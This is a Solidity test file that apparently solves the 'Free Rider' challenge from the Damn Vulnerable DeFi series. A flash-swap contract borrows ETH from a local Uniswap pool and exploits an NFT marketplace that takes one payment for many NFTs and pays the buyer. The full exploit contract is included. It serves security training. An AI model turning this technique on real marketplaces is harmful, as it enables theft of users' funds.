// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../src/DamnValuableToken.sol";
import "../../src/DamnValuableNFT.sol";
import "../../src/free-rider/FreeRiderRecovery.sol.sol";
import "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import "openzeppelin-contracts/token/ERC721/utils/ERC721Holder.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "solmate/tokens/ERC20.sol";

contract FlashSwapV2 is IUniswapV2Callee, ERC721Holder {
    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace marketplace;
    address owner;
    address buyerNFT;
    uint8 numberOfNFT;
    uint256 nftPrice;

    constructor(
        IUniswapV2Pair _pair,
        FreeRiderNFTMarketplace _marketplace,
        uint8 _numberOfNFT,
        uint256 _nftPrice,
        address _buyerNFT
    ) {
        owner = msg.sender;
        pair = _pair;
        marketplace = _marketplace;
        numberOfNFT = _numberOfNFT;
        nftPrice = _nftPrice;
        buyerNFT = _buyerNFT;
    }

    function exploit() external {
        // need to pass some data to trigger uniswapV2Call
        // borrow 15 ether of WETH
        bytes memory data = abi.encode(pair.token0(), nftPrice);

        pair.swap(nftPrice, 0, address(this), data);
    }

    // called by pair contract
    function uniswapV2Call(
        address _sender,
        uint256,
        uint256,
        bytes calldata _data
    ) external override {
        require(msg.sender == address(pair), "!pair");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount) = abi.decode(
            _data,
            (address, uint256)
        );

        // about 0.3%
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        // unwrap WETH
        IWETH weth = IWETH(tokenBorrow);
        weth.withdraw(amount);

        // buy tokens from the marketplace
        uint256[] memory tokenIds = new uint256[](numberOfNFT);
        for (uint256 tokenId = 0; tokenId < numberOfNFT; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }
        marketplace.buyMany{value: nftPrice}(tokenIds);
        DamnValuableNFT nft = DamnValuableNFT(marketplace.token());

        // send all of them to the buyer
        for (uint256 tokenId = 0; tokenId < numberOfNFT; tokenId++) {
            tokenIds[tokenId] = tokenId;
            nft.safeTransferFrom(
                address(this),
                buyerNFT,
                tokenId,
                abi.encode(address(this))
            );
        }
        // wrap enough WETH9 to repay our debt
        weth.deposit{value: amountToRepay}();

        // repay the debt
        ERC20(tokenBorrow).transfer(address(pair), amountToRepay);

        // selfdestruct to the owner
        owner.call{value: address(this).balance}("");
    }

    receive() external payable {}
}

contract FreeRiderTest is BaseTest, ERC721Holder {
    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 NFT_PRICE = 15 ether;
    uint8 AMOUNT_OF_NFTS = 6;
    uint256 MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 ATTACKER_INITIAL_ETH_BALANCE = 0.1 ether;

    // The buyer will offer 45 ETH as payout for the job
    uint256 BUYER_PAYOUT = 45 ether;

    // Initial reserves for the Uniswap v2 pool
    uint256 UNISWAP_INITIAL_TOKEN_RESERVE = 15_000 ether;
    uint256 UNISWAP_INITIAL_WETH_RESERVE = 9_000 ether;

    DamnValuableToken token;
    IWETH weth;
    DamnValuableNFT nft;
    IUniswapV2Pair uniswapPair;
    IUniswapV2Factory uniswapFactory;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecovery buyerContract;

    address attacker;
    address buyer;

    constructor() {
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";
        labels[1] = "Buyer";

        preSetup(2, ATTACKER_INITIAL_ETH_BALANCE, labels);
    }

    function setUp() public override {
        super.setUp();
        vm.label(address(this), "deployer");

        // set block timestamp > 0
        vm.warp(1);

        attacker = users[0];
        buyer = users[1];

        // Deploy WETH contract
        address _weth = deployCode("artifacts/WETH9.json");
        weth = IWETH(_weth);

        // Deploy token to be traded against WETH in Uniswap v2
        token = new DamnValuableToken();

        // Deploy Uniswap Factory and Router
        // address(0) -> _feeToSetter
        address _uniswapFactory = deployCode(
            "node_modules/@uniswap/v2-core/build/UniswapV2Factory.json",
            abi.encode(address(0))
        );

        uniswapFactory = IUniswapV2Factory(_uniswapFactory);

        address _uniswapRouter = deployCode(
            "node_modules/@uniswap/v2-periphery/build/UniswapV2Router02.json",
            abi.encode(_uniswapFactory, _weth)
        );

        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // Note that the function takes care of deploying the pair automatically
        token.approve(_uniswapRouter, UNISWAP_INITIAL_TOKEN_RESERVE);

        IUniswapV2Router02(_uniswapRouter).addLiquidityETH{
            value: UNISWAP_INITIAL_WETH_RESERVE
        }(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            address(this), // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(
            uniswapFactory.getPair(address(token), _weth)
        );
        assertEq(uniswapPair.token0(), _weth);
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(address(this)), 0);

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);
        vm.label(address(marketplace), "Marketplace");

        // Deploy NFT contract
        nft = DamnValuableNFT(marketplace.token());
        vm.label(address(nft), "DamnValuableNFT");

        // Ensure deployer owns all minted NFTs and approve the marketplace to trade them
        // and setup offers
        uint256[] memory ids = new uint256[](6);
        uint256[] memory offers = new uint256[](6);
        for (uint8 id = 0; id < AMOUNT_OF_NFTS; id++) {
            ids[id] = id;
            offers[id] = NFT_PRICE;
            assertEq(nft.ownerOf(id), address(this));
        }

        nft.setApprovalForAll(address(marketplace), true);

        marketplace.offerMany(ids, offers);
        assertEq(marketplace.offersCount(), 6);

        // Give enough funds to the buyer to send to the FreeRideBuyer contract
        vm.deal(buyer, BUYER_PAYOUT);
        // Deploy buyer's contract, adding the attacker as the partner
        vm.prank(buyer);
        buyerContract = new FreeRiderRecovery{value: BUYER_PAYOUT}(
            address(attacker),
            address(nft)
        );
        vm.label(address(buyerContract), "FreeRiderRecovery");
    }

    function test_ExploitFreeRider() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        // NFT Marketplace not only allows to buy many NFTs for the price of one (msg.value in the loop)
        // But it also pays many back to the seller AFTER transfer of ownership - to the BUYER!
        vm.startPrank(attacker);

        assertEq(address(attacker).balance, ATTACKER_INITIAL_ETH_BALANCE);

        FlashSwapV2 flashSwapper = new FlashSwapV2(
            uniswapPair,
            marketplace,
            AMOUNT_OF_NFTS,
            NFT_PRICE,
            address(buyerContract)
        );

        vm.label(address(flashSwapper), "FlashSwapV2");

        assertEq(address(flashSwapper).balance, 0 ether);

        assertEq(address(attacker).balance, ATTACKER_INITIAL_ETH_BALANCE);

        flashSwapper.exploit();

        assertEq(address(flashSwapper).balance, 0 ether);

        vm.stopPrank();
    }

    function success() internal override {
        // We got 15 flashloan -> bought 6 nfts for 15 (bug that pays buyer) -> repay 15 = 70 -> sent nfts to buyer got prize 45  == ~120
        assertGt(attacker.balance, 120 ether);

        assertEq(address(buyerContract).balance, 0);
        // // // The buyer extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            assertEq(nft.ownerOf(tokenId), address(buyerContract));
        }
        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertEq(
            address(marketplace).balance,
            MARKETPLACE_INITIAL_ETH_BALANCE - 5 * NFT_PRICE
        );
    }
}
